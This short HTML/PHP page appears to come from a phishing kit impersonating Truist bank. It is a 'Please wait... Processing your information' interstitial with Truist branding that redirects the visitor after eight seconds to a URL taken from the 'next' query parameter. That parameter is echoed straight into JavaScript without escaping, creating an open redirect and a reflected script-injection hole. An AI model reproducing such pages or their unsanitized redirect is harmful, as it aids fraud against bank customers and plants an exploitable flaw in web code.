<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link rel="stylesheet" href="res/css/card.css">
</head> 
<body>
<header>
    <img src="res/img/logos.png">
</header>
<main>
    
<div class="title">
Please wait...
</div>

    <div class="container"> 
    <div class="text">Processing your information...</div>
    <img src="res/img/loading.gif" style="width:60px;">
    </div>

</main>
<footer>
© 2024, Truist. All Rights Reserved.
</footer>

<script>
var next = "<?php echo $_GET['next']; ?>";
setTimeout(() => {
    window.location=next;
}, 8000);
</script>   
</body>
</html>

